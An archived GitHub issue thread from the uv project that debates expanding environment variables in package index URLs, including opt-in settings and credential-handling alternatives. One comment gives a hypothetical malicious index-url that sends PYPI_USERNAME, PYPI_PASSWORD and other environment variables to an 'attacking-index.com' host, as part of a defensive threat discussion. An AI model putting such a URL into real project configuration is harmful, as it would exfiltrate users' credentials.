<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Expand environment variables in user-provided index URLs - astral-sh/uv #5734</title>
    <link rel="stylesheet" href="../../../style.css">
</head>
<body>
    <div class="back-link">
        <a href="../../../index.html">Back to index</a>
    </div>

    <h1>Expand environment variables in user-provided index URLs</h1>

    <div class="meta">
        <span class="state state-open">Open</span>
        <a href="https://github.com/astral-sh/uv/issues/5734">#5734</a>
        opened by <a href="https://github.com/charliermarsh">@charliermarsh</a>
        on 2024-08-02 19:32
    </div>

    <div class="timeline">
        <div class="timeline-entry">
            <div class="timeline-header">Issue opened by <a href="https://github.com/charliermarsh">@charliermarsh</a> on 2024-08-02 19:32</div>
            <div class="timeline-body"><p>Right now, we only support expansion (1) by the shell (of course) and (2) in requirements files. But the following don't expand:</p>
<ul>
<li><code>cargo run pip install flask --index-url 'https://${PYPI_USERNAME}.com/repository/pypi-proxy/simple/flask/'</code></li>
<li>Anything in a <code>uv.toml</code> or <code>pyproject.toml</code> file</li>
</ul>
</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Label <span class="label">compatibility</span> added by @charliermarsh on 2024-08-02 19:32</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Referenced in <a href="../issues/5119.html">astral-sh/uv#5119</a> on 2024-08-02 19:32</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/charliermarsh">@charliermarsh</a> on 2024-08-02 20:42</div>
            <div class="timeline-body"><p>It looks like pip does <em>not</em> support either of these.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/charliermarsh">@charliermarsh</a> on 2024-08-02 20:43</div>
            <div class="timeline-body"><p>Poetry does not support the latter: https://github.com/python-poetry/poetry/issues/208</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/charliermarsh">@charliermarsh</a> on 2024-08-02 20:44</div>
            <div class="timeline-body"><p>Rust does not support this but the issue is not closed: https://github.com/rust-lang/cargo/issues/10789</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/charliermarsh">@charliermarsh</a> on 2024-08-02 20:48</div>
            <div class="timeline-body"><p>I am not strictly opposed to it but we should get some more opinions (\cc @zanieb @BurntSushi @konstin).</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/chrisrodrigue">@chrisrodrigue</a> on 2024-08-02 21:31</div>
            <div class="timeline-body"><p>PDM supports this:  <a href="https://pdm-project.org/latest/usage/config/#store-credentials-with-the-index">Store credentials with the index</a>, <a href="https://pdm-project.org/latest/usage/dependency/#local-dependencies">Local dependencies</a></p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/chrisrodrigue">@chrisrodrigue</a> on 2024-08-02 21:31</div>
            <div class="timeline-body"><p>Hatch also supports this: <a href="https://hatch.pypa.io/latest/config/context/#context-formatting">Context formatting</a></p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/eth3lbert">@eth3lbert</a> on 2024-08-02 22:23</div>
            <div class="timeline-body"><p>I looked around Poetry's document and found this https://python-poetry.org/docs/configuration/#http-basicnameusernamepassword .</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/CoolCat467">@CoolCat467</a> on 2024-08-03 06:39</div>
            <div class="timeline-body"><p>I know I'm not a maintainer of uv, but I strongly suggest that if environment lookups were added that they be opt-in. I've heard of things going very bad security wise from environment variables.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/zanieb">@zanieb</a> on 2024-08-03 14:10</div>
            <div class="timeline-body"><p>Can you share more details or examples please @CoolCat467?</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/zanieb">@zanieb</a> on 2024-08-03 14:14</div>
            <div class="timeline-body"><p>Something like <code>--allow-variable &lt;NAME&gt;</code> might make sense for opt-in per-variable. We probably want to consider how we want the UX to work for lockfiles and credentials in general. I think expanding environment variables is probably not the best solution, it seems like we'd be better off finding a matching URL in our configuration file and pulling authentication from there (we need and want to support declaring indexes anyway).</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/eth3lbert">@eth3lbert</a> on 2024-08-03 14:14</div>
            <div class="timeline-body"><p>Cargo has https://doc.rust-lang.org/cargo/reference/config.html#env</p>
<p>Might not directly related but there's also https://doc.rust-lang.org/cargo/reference/config.html#credentials.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/chrisrodrigue">@chrisrodrigue</a> on 2024-08-03 17:38</div>
            <div class="timeline-body"><p>Related: #5119</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/chrisrodrigue">@chrisrodrigue</a> on 2024-08-03 18:12</div>
            <div class="timeline-body"><p>@CoolCat467</p>
<blockquote>
<p>I know I'm not a maintainer of uv, but I strongly suggest that if environment lookups were added that they be opt-in. I've heard of things going very bad security wise from environment variables.</p>
</blockquote>
<p>Currently <code>uv.lock</code> exposes API keys in source URLs which means a lot of users canâ€™t check it into version control.</p>
<p>One of the strengths of environment variables is avoiding version control. Most VCSs support masking environment variables from job/log output when expanded. See <a href="https://docs.gitlab.com/ee/ci/variables/#mask-a-cicd-variable">GitLab</a> and <a href="https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions#example-masking-an-environment-variable">GitHub</a> docs.</p>
<p>They arenâ€™t 100% foolproof. I think thereâ€™s a tradeoff between flexibility and security.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/BurntSushi">@BurntSushi</a> on 2024-08-05 14:01</div>
            <div class="timeline-body"><blockquote>
<p><code>cargo run pip install flask --index-url 'https://${PYPI_USERNAME}.com/repository/pypi-proxy/simple/flask/'</code></p>
</blockquote>
<p>I think I would personally find it very surprising if an environment variable got expanded here. Basically, if I'm running a Unix shell command and I use single quotes, I have a very strong prior that the string is interpreted literally with no interpolation.</p>
<blockquote>
<p>Something like <code>--allow-variable &lt;NAME&gt;</code> might make sense for opt-in per-variable. We probably want to consider how we want the UX to work for lockfiles and credentials in general. I think expanding environment variables is probably not the best solution, it seems like we'd be better off finding a matching URL in our configuration file and pulling authentication from there (we need and want to support declaring indexes anyway).</p>
</blockquote>
<p>:+1: on this (including that env vars are maybe not the best solution to this specific problem), but having an explicit <code>--allow-variable</code> I think would help mitigate some concerns here.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Label <span class="label">needs-decision</span> added by @charliermarsh on 2024-08-06 19:39</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/jfgordon2">@jfgordon2</a> on 2024-08-22 04:47</div>
            <div class="timeline-body"><p>I'm currently looking at using uv instead of pipenv for our projects, and env var expansion is something we use with pipenv and our AWS CodeArtifact repo.  Not having this makes things a bit more complicated to use uv (i.e. we can't easily specify in the pyproject.toml file where the packages are located without constant updates since the index url contains the auth and it's only good for a limited time).</p>
<p>I'm not sure I understand the concern around env var expansion within a url for this use-case, though.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Referenced in <a href="../issues/171.html">astral-sh/uv#171</a> on 2024-09-14 03:14</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Referenced in <a href="../issues/7660.html">astral-sh/uv#7660</a> on 2024-09-24 21:40</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/woutervh">@woutervh</a> on 2024-10-01 08:24</div>
            <div class="timeline-body"><p>&quot;opt-in variables&quot;?  because you don't trust your own environment-variables? That makes zero sense to me.</p>
<blockquote>
<p>Currently uv.lock exposes API keys in source URLs which means a lot of users canâ€™t check it into version control.</p>
</blockquote>
<p>The source-urls in the lockfile could just use the verbatim non-resolved strings &quot;https://${PYPI_USERNAME}:${PYPI_USERNAME}...&quot;</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Referenced in <a href="../issues/1384.html">astral-sh/uv#1384</a> on 2024-10-02 23:22</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/paveldikov">@paveldikov</a> on 2024-10-15 09:46</div>
            <div class="timeline-body"><p>Coming from a very strongly-regulated background, hard agree with @CoolCat467. IMHO security-by-default is <em>the way</em>. I am not strictly opposed to the feature, but if it is to be implemented I believe it should not be on by default.</p>
<p><em>(also, TBH, I struggle to understand the use case... if you want to interpolate secrets from env vars, why not just pass <code>UV_EXTRA_INDEX_URL</code>? Are we trying to over-compensate for UX gaps in CI/CD platforms?)</em></p>
<hr />
<p>People have been bitten countless times by tools doing insecure-by-default behaviours (NGINX and Docker are my two favourite examples). I'd really rather not be in the position of having to bolt-on extra security on top of <code>uv</code>.</p>
<blockquote>
<p>because you don't trust your own environment-variables?</p>
</blockquote>
<p>As ridiculous/paranoid as it may sound to those not in heavily-regulated fields -- nope, I do not trust my own env vars not to get leaked. This happens all the time, and if you are especially unfortunate, can lead to multi-billion $$$ costs.</p>
<p>And although solutions such as in-line log filters may do a decent job at scrubbing secrets out of stdout/stderr... those are still best-effort. And there are countless other places I could leak my secrets -- e.g. I could inadvertently publish them as part of my wheel/container image/rpm/deb. Obviously no one will really want to do the latter, but as <code>uv</code>'s functionality and complexity grows, it is not impossible to think of an evolutionary path where this sort of vulnerability takes shape.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/woutervh">@woutervh</a> on 2024-10-15 22:34</div>
            <div class="timeline-body"><p>@paveldikov You argue against putting secrets in environment variables, because they might be leaked (see uv.lock). OK, Then don't.  I worked for years in the pharma-industry, and currently work in another highly regulated industry.</p>
<p>I fail to see a structural difference between putting your secrets in UV_INDEX_URL or in a extrapolated variable in pyproject.toml.
I fail to see why the former would be more safe than the latter.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/paveldikov">@paveldikov</a> on 2024-10-15 23:26</div>
            <div class="timeline-body"><p>@woutervh</p>
<blockquote>
<p>You argue against putting secrets in environment variables, because they might be leaked (see uv.lock). OK, Then don't.</p>
</blockquote>
<p>This is actually not what I am saying. I do happen to dislike secrets-in-environment-variables, but I am not actually <em>arguing against them</em>. I am well aware that they are a fact of life in a number of commonly-used CI/CD platforms.</p>
<p>What I am rather saying is that this feature should not be on <em>by default</em>. I'd be perfectly happy with an <code>allow-env-substitution</code> setting exposed in <code>{uv,pyproject}.toml</code>. So you'd have:</p>
<pre><code class="language-toml">index-url = &quot;https://${PYPI_USERNAME}.com/repository/pypi-proxy/simple/flask/&quot;
allow-env-substitution = true
</code></pre>
<p>Simple as that. I think it's a no-brainer: if you want the expressive-but-less-secure behaviour, add an extra line in your config, and be done with it.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/DanCardin">@DanCardin</a> on 2024-10-16 01:25</div>
            <div class="timeline-body"><p>it feels like that setting would have to be itself an env var (or uv global setting) to make any sense to me...</p>
<p>Like if you're explicitly describing your index-url as having this special interpolation syntax, then obviously you'll always be setting that config value as true in conjunction (having it as false would never be correct).</p>
<p>To me it feels like the attack you're trying guard against is some package which sets <code>index-url = &quot;https://attacking-index.com/${PYPI_USERNAME}/${PYPI_PASSWORD}/${OTHER_UNRELATED_ENV_VARS_TO_EXFILTRATE}&quot;</code>, and naively <code>uv install</code>ing in that package might expose your env vars in an uncontrollable way?</p>
<p>The pyproject.toml author needn't fear their own project settings/values, afaict (again, because if you can control the url, you can control that setting. But perhaps you as the consumer of some unknown pyproject.toml maybe ought to fear using it if this feature exists. Whereas today where you're explicitly mapping a given domain to the credentials (with something like netrc or keychain), or supplying them directly through UV_* env vars.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/paveldikov">@paveldikov</a> on 2024-10-16 09:05</div>
            <div class="timeline-body"><blockquote>
<p>But perhaps you as the consumer of some unknown pyproject.toml maybe ought to fear using it if this feature exists</p>
</blockquote>
<p>Exactly. Two scenarios that come to mind immediately:</p>
<ul>
<li>installing 3rd party package from sdist</li>
<li>CI/CD platform ran by an individual/team that is not directly responsible for the code that is being deployed.<ul>
<li>'trust' is funny one in this instance. The platform team generally trusts in the developer/code owner's <em>good intentions</em>, but not necessarily their <em>competence</em>. As such CI/CD owners go to quite some effort to implement guard rails to mitigate the risk of self-sabotage, in this instance, credential leakage/exfiltration.</li>
</ul>
</li>
</ul>
<p>(FWIW the idea of consuming an untrusted <code>pyproject.toml</code> which specifies an arbitrary/untrusted index -- even without interpolation -- terrifies me too. But that's a separate problem, and a very thorny one too)</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/DanCardin">@DanCardin</a> on 2024-10-16 12:02</div>
            <div class="timeline-body"><p>I'm not sure exactly what mitigation makes the most sense, but basically my point was that the operator of the environment ought to be the one controlling access (default or not) to this feature. e.g. environment variable or uv setting. Whereas it being enableable by the person controlling the pyproject.toml would be where I could see there being issues.</p>
<p>The other problem, if you take this issue seriously, would be that just enabling it or disabling it seems likely to not be particularly useful. If you're operating in a project that uses the feature, likely you'd just plop the enabling env var into a bashrc and go about your day, worse if it defaults on.</p>
<p>Akin to index credentials themselves (by keychain) seems like it'd need to be something that maps index domain (not name, seems like that would also be too easy to attack) to allowed env vars. It just starts to get very un-ergonomic very quick; unless perhaps it was a JIT approval the first time for a given index.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/Kristina-Pianykh">@Kristina-Pianykh</a> on 2024-10-22 08:41</div>
            <div class="timeline-body"><p>The problem with the first issue is the use of single quotes which tell bash to interpret the string literally. Use double quotes for string interpolation</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Referenced in <a href="../issues/8443.html">astral-sh/uv#8443</a> on 2024-10-22 10:55</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Referenced in <a href="../issues/8510.html">astral-sh/uv#8510</a> on 2024-10-23 22:37</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Referenced in <a href="../issues/8529.html">astral-sh/uv#8529</a> on 2024-10-24 14:39</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Referenced in <a href="../../zanieb/uv/issues/6.html">zanieb/uv#6</a> on 2024-11-26 17:33</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Referenced in <a href="../issues/9452.html">astral-sh/uv#9452</a> on 2024-11-26 21:15</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Referenced in <a href="../issues/10096.html">astral-sh/uv#10096</a> on 2024-12-26 14:33</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/dpnova">@dpnova</a> on 2025-01-08 05:21</div>
            <div class="timeline-body"><p>Just posted this over on #10096</p>
<p>would love to be able to do something like this:</p>
<pre><code class="language-toml">[tool.uv.sources]
foo = { git = &quot;https://${GITHUB_TOKEN}@github.com/fooco/foo.git&quot; }
</code></pre>
<p>Agree with requiring an option to enable it.</p>
<p>Also open to other options to achieve the above of course.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/remss">@remss</a> on 2025-01-31 10:25</div>
            <div class="timeline-body"><p>An other use case it to allow users to set the mirror they want for a source.</p>
<p>For example</p>
<pre><code class="language-toml">[[tool.uv.index]]
name = &quot;torch-gpu&quot;
url = &quot;${TORCH_URL}&quot;
explicit = true
</code></pre>
<p>The user could then set environment variable to what is convenient for him, like <code>TORCH_URL=&quot;https://download.pytorch.org/whl/cu121&quot;</code> or a private mirror <code>TORCH_URL=&quot;https://mycompany.com/mirror-torch-cu121&quot;</code></p>
<p>Cherry on top: support default variable value like Bash</p>
<pre><code class="language-toml">[[tool.uv.index]]
name = &quot;torch-gpu&quot;
url = &quot;${TORCH_URL:-https://download.pytorch.org/whl/cu121}&quot;
explicit = true
</code></pre>
<p>Currently I don't see any way to change source URL without touching the .toml / .lock to define custom mirrors. So I think this feature request is important.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/NixBiks">@NixBiks</a> on 2025-01-31 10:36</div>
            <div class="timeline-body"><p>I also have a use case where I need to install <a href="https://prodi.gy/docs/install#pip"><code>prodigy</code></a> which requires a licence key. According to their docs you can install prodigy like this</p>
<pre><code>python -m pip install prodigy --extra-index-url https://XXXX-XXXX-XXXX-XXXX@download.prodi.gy
</code></pre>
<p>But it's not clear to me how one could add the dependency in <code>pyproject.toml</code> with <code>uv</code>.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/CoolCat467">@CoolCat467</a> on 2025-01-31 15:42</div>
            <div class="timeline-body"><p>Try</p>
<pre><code>uv add prodigy --extra-index-url https://XXXX-XXXX-XXXX-XXXX@download.prodi.gy
</code></pre>
<p>but do note this will create a <code>uv.lock</code> file</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/celsiusnarhwal">@celsiusnarhwal</a> on 2025-02-11 20:29</div>
            <div class="timeline-body"><blockquote>
<p>I also have a use case where I need to install <a href="https://prodi.gy/docs/install#pip"><code>prodigy</code></a> which requires a licence key. According to their docs you can install prodigy like this</p>
<pre><code>python -m pip install prodigy --extra-index-url https://XXXX-XXXX-XXXX-XXXX@download.prodi.gy
</code></pre>
<p>But it's not clear to me how one could add the dependency in <code>pyproject.toml</code> with <code>uv</code>.</p>
</blockquote>
<p>Not a Prodigy user, but I am pretty sure uv's <a href="https://docs.astral.sh/uv/configuration/indexes/#providing-credentials">basic authentication support</a> should do the job.</p>
<p>For example:</p>
<pre><code class="language-toml"># pyproject.toml

[[tool.uv.index]]
name = &quot;prodigy&quot;
url = &quot;https://download.prodi.gy/index&quot;
</code></pre>
<pre><code class="language-shell">export UV_INDEX_PRODIGY_PASSWORD=YOUR_PRODIGY_LICENSE_KEY
uv add prodigy
</code></pre>
</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Referenced in <a href="../issues/13206.html">astral-sh/uv#13206</a> on 2025-04-29 23:45</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/vizeit">@vizeit</a> on 2025-04-30 04:38</div>
            <div class="timeline-body"><p>Thanks @zanieb for the reference in #13206
It will be very helpful to either get a solution for using environment variable or a workaround. Thank you maintainers of uv, great tool!</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/charliermarsh">@charliermarsh</a> on 2025-05-07 15:16</div>
            <div class="timeline-body"><p>You should defined these as name indexes, and set the appropriate environment variables: https://docs.astral.sh/uv/configuration/indexes/#providing-credentials-directly</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/mattconway1984">@mattconway1984</a> on 2025-05-07 15:20</div>
            <div class="timeline-body"><blockquote>
<p>You should defined these as name indexes, and set the appropriate environment variables: https://docs.astral.sh/uv/configuration/indexes/#providing-credentials-directly</p>
</blockquote>
<p>So does the following:</p>
<pre><code class="language-[[tool.uv.index]]">name = &quot;internal-proxy&quot;
url = &quot;https://example.com/simple&quot;
</code></pre>
<pre><code>export UV_INDEX_INTERNAL_PROXY_USERNAME=public
export UV_INDEX_INTERNAL_PROXY_PASSWORD=koala
</code></pre>
<p>result in a URL formed as:</p>
<p><code>https://public:koala@example.com/simple</code></p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/charliermarsh">@charliermarsh</a> on 2025-05-07 15:21</div>
            <div class="timeline-body"><p>Yes.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/pt-hephtal">@pt-hephtal</a> on 2025-05-07 18:15</div>
            <div class="timeline-body"><blockquote>
<p>Just posted this over on <a href="https://github.com/astral-sh/uv/issues/10096">#10096</a></p>
<p>would love to be able to do something like this:</p>
<p>[tool.uv.sources]
foo = { git = &quot;https://${GITHUB_TOKEN}@github.com/fooco/foo.git&quot; }
Agree with requiring an option to enable it.</p>
<p>Also open to other options to achieve the above of course.</p>
</blockquote>
<p>Thanks for the useful replies so far, Is there any recommendations on how to approach this?</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/mvechtomova">@mvechtomova</a> on 2025-05-07 21:45</div>
            <div class="timeline-body"><blockquote>
<p>Just posted this over on <a href="https://github.com/astral-sh/uv/issues/10096">#10096</a></p>
<p>would love to be able to do something like this:</p>
<p>[tool.uv.sources]
foo = { git = &quot;https://${GITHUB_TOKEN}@github.com/fooco/foo.git&quot; }
Agree with requiring an option to enable it.</p>
<p>Also open to other options to achieve the above of course.</p>
</blockquote>
<p>We got it working like:</p>
<p>[tool.uv.sources]
foo = { git = &quot;https://${GITHUB_TOKEN}@github.com/fooco/foo.git&quot;, rev=&quot;<git commit hash>&quot; }
It is not really supported as it seems, but we tested in on multiple OS. foo must be specified in dependencies list without any version.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/pt-hephtal">@pt-hephtal</a> on 2025-05-12 11:01</div>
            <div class="timeline-body"><blockquote>
<blockquote>
<p>Just posted this over on <a href="https://github.com/astral-sh/uv/issues/10096">#10096</a>
would love to be able to do something like this:
[tool.uv.sources]
foo = { git = &quot;https://${GITHUB_TOKEN}@github.com/fooco/foo.git&quot; }
Agree with requiring an option to enable it.
Also open to other options to achieve the above of course.</p>
</blockquote>
<p>We got it working like:</p>
<p>[tool.uv.sources] foo = { git = &quot;https://${GITHUB_TOKEN}@github.com/fooco/foo.git&quot;, rev=&quot;&quot; } It is not really supported as it seems, but we tested in on multiple OS. foo must be specified in dependencies list without any version.</p>
</blockquote>
<p>Hey Maria, thanks for the reply. I tried this locally with no luck.</p>
<p>I was wondering if you're running this in github actions or similar? If so, then the environment variable could be triggering <a href="https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication">automatic token auth</a></p>
<p>This made me realise I could;
Add the following to the <code>.git/config</code> of repo using the package for local dev...</p>
<pre><code>[url &quot;https://oauth2:${GITHUB_TOKEN}@github.com/&quot;]
    insteadOf = https://github.com/
</code></pre>
<p>and the following in the <code>pyproject.toml</code></p>
<pre><code>dependencies = [
    &quot;v-cool-private-package&gt;=0.1.0&quot;,
]

[tool.uv.sources]
v-cool-private-package = { git = &quot;https://github.com/org/v-cool-private-package.git&quot;, subdirectory = &quot;directory/ifnotroot&quot;, rev = &quot;main&quot; }
</code></pre>
<p>It doesn't feel lovely, but works for now ðŸ˜¬</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Referenced in <a href="../../prefix-dev/pixi/issues/3755.html">prefix-dev/pixi#3755</a> on 2025-05-13 08:43</div>
        </div>
        <div class="timeline-entry">
            <div class="event">Referenced in <a href="../pulls/13879.html">astral-sh/uv#13879</a> on 2025-06-06 04:05</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/msabramo">@msabramo</a> on 2025-06-06 14:14</div>
            <div class="timeline-body"><blockquote>
<p>I'm not sure exactly what mitigation makes the most sense, but basically my point was that the operator of the environment ought to be the one controlling access (default or not) to this feature. e.g. environment variable or uv setting. Whereas it being enableable by the person controlling the pyproject.toml would be where I could see there being issues.</p>
<p>The other problem, if you take this issue seriously, would be that just enabling it or disabling it seems likely to not be particularly useful. If you're operating in a project that uses the feature, likely you'd just plop the enabling env var into a bashrc and go about your day, worse if it defaults on.</p>
<p>Akin to index credentials themselves (by keychain) seems like it'd need to be something that maps index domain (not name, seems like that would also be too easy to attack) to allowed env vars. It just starts to get very un-ergonomic very quick; unless perhaps it was a JIT approval the first time for a given index.</p>
</blockquote>
<p>I want to address the security concerns and people wanting environment variable substitution in <code>pyproject.toml</code> to have to be explicitly enabled in <code>pyproject.toml</code>, as shown below:</p>
<pre><code class="language-toml">[[tool.uv.index]]
name = &quot;artifactory&quot;
url = &quot;https://${ARTIFACTORY_USER}:${ARTIFACTORY_API_TOKEN}@artifactory.company.com/simple&quot;
allow-env-substitution = true
</code></pre>
<h3>Key Points:</h3>
<ol>
<li><p><strong>Security Concerns</strong>:</p>
<ul>
<li>The primary concern, raised by <strong>@paveldikov</strong> and others, is the risk of leaking environment variable values, especially when installing someone else's package.</li>
<li>Within a project, using environment variable substitution seems safe since the project author and other project developers explicitly intend it and need it (Correct me if I'm wrong). However, the risk arises when the package is published and consumed by others. In others, the concern is specifically for <strong>consumers</strong> of the project and not <strong>developers</strong> of the project (but again, correct me if I'm wrong).</li>
</ul>
</li>
<li><p><strong>Consumer Control</strong>:</p>
<ul>
<li>As <strong>@DanCardin</strong> suggests, the decision to enable environment variable substitution should rest with the <strong>consumer</strong> of the package and not the package developer (who clearly needs the feature to be enabled).</li>
</ul>
</li>
</ol>
<h3>Proposed Solution:</h3>
<ul>
<li><p><strong>Default Behavior</strong>:<br />
<code>uv</code> should globally default to <strong>disabling</strong> environment variable substitution to prioritize security (secure by default).</p>
</li>
<li><p><strong>Error Handling</strong>:<br />
If a user runs a <code>uv</code> command to install a package using interpolation syntax, they should receive a warning explaining:</p>
<ul>
<li>The package requires environment variable substitution.</li>
<li>How to proceed, depending on whether they want to allow this feature or not</li>
<li>A link to detailed documentation on the security implications of enabling the feature.</li>
<li>To make this more concrete, the warning could look something like this:<pre><code>Warning: uv environment variable substitution in pyproject.toml files is disabled.

The package 'foo' requires environment variable substitution for an index URL:
url = &quot;https://${ARTIFACTORY_USER}:${ARTIFACTORY_API_TOKEN}@artifactory.company.com/simple&quot;

Allow? (N/y/a): 
  N - Disallow environment variable substitution (default)
  y - Allow environment variable substitution just once
  a - Allow environment variable substitution always (this will add the following to ~/.config/uv/uv.toml:
          [settings]
          enable-env-var-substitution = true

For more details on enabling this feature and its security implications, visit:
https://example.com/docs/uv/env-var-substitution
</code></pre>
</li>
</ul>
</li>
<li><p><strong>Optional Exception</strong>:<br />
Optionally, an exception could be made for <code>uv sync</code> when processing a <code>pyproject.toml</code> in the same directory as the command invocation. This would allow environment variable substitution in this specific case. Maybe this is an exception that adds unwarranted maintenance complexity though?</p>
</li>
</ul>
<h3>User Choice:</h3>
<ul>
<li>Users valuing convenience can enable the feature.</li>
<li>Those prioritizing security can leave it disabled.</li>
</ul>
<hr />
<p><strong>Note</strong>: PR #13879 does not implement this proposal but can be updated based on further discussion and consensus.</p>
</div>
        </div>
        <div class="timeline-entry">
            <div class="timeline-header">Comment by <a href="https://github.com/msabramo">@msabramo</a> on 2025-06-06 15:05</div>
            <div class="timeline-body"><p>Possibly sort of a tangent, but I also wonder if the <strong>real</strong> concern here is not so much environment variable substitution as the <strong>URLs</strong> (or <strong>domains</strong> really) that <code>uv</code> is perhaps unexpectedly reaching out to...? If you're installing some package and it's fetching from https://attacking-index.com, that seems like a concern, even if no environment variables are involved.</p>
<p>I think this might be what @paveldikov is alluding to with this commment?</p>
<blockquote>
<p>(FWIW the idea of consuming an untrusted pyproject.toml which specifies an arbitrary/untrusted index
-- even without interpolation -- terrifies me too.
But that's a separate problem, and a very thorny one too)</p>
</blockquote>
<p>In other words, maybe the <strong>real</strong> concern here is that this feature causes <code>uv</code> to fetch from something like:
https://joeuser:xyz123@artifactory.company.com/simple or even https://attacking-index.com/simple</p>
<p>and maybe <strong>that's</strong> what they weren't expecting?</p>
<p>If that is the fear, then I wonder if the best thing for security is for <code>uv</code> to not use new URLs without the user's permission. That might look like:</p>
<pre><code>Warning: The package 'foo' wants to make HTTP requests to

url = &quot;https://${ARTIFACTORY_USER}:${ARTIFACTORY_API_TOKEN}@artifactory.company.com/simple&quot;

Allow? (N/y/a): 
  N - Disallow (default)
  y - Allow just once
  a - Allow environment variable substitution always (this will add the following to ~/.config/uv/uv.toml:
          [[index]]
          url = &quot;https://${ARTIFACTORY_USER}:${ARTIFACTORY_API_TOKEN}@artifactory.company.com/simple&quot;

For more details on enabling this feature and its security implications, visit:
https://example.com/docs/uv/index-allow-list
</code></pre>
<p>So this is a different and orthogonal paradigm perhaps for handling security concerns. Instead of controlling the access to environment variables, we're controlling access to domains. Kind of analogous to all the security features that browsers have for same origin and what not, which perhaps could be a good inspiration for what <code>uv</code> could do.</p>
<p>That I think would probably be a separate issue from this one, because it doesn't really have to do with environment variables. Any unexpected index URL I would think could be a security concern, even if it doesn't use environment variables - e.g.:</p>
<pre><code class="language-toml">[[tool.uv.index]]
url = &quot;https://attacking-index.com/simple&quot;
</code></pre>
<p>I could even imagine that in certain super-security-conscious environments, they may want to use their own internal package index only and not even reach out to <strong>PyPI</strong>. A user in such an environment I could imagine might <strong>want</strong> to get this warning the first time they use <code>uv</code>:</p>
<pre><code>Warning: The package 'foo' wants to make HTTP requests to

url = &quot;https://pypi.org/simple/&quot;

Allow? (N/y/a): 
  N - Disallow (default)
  y - Allow just once
  a - Allow environment variable substitution always (this will add the following to ~/.config/uv/uv.toml:
          [[index]]
          url = &quot;https://pypi.org/simple/&quot;

For more details on enabling this feature and its security implications, visit:
https://example.com/docs/uv/index-allow-list
</code></pre>
<p>OTOH, maybe folks who are that security-conscious would have firewall rules that block https://pypi.org/simple/ and so maybe <code>uv</code> doesn't need to put a fairly annoying inconvenience on most users for the small minority that don't trust PyPI and don't have other security measures.</p>
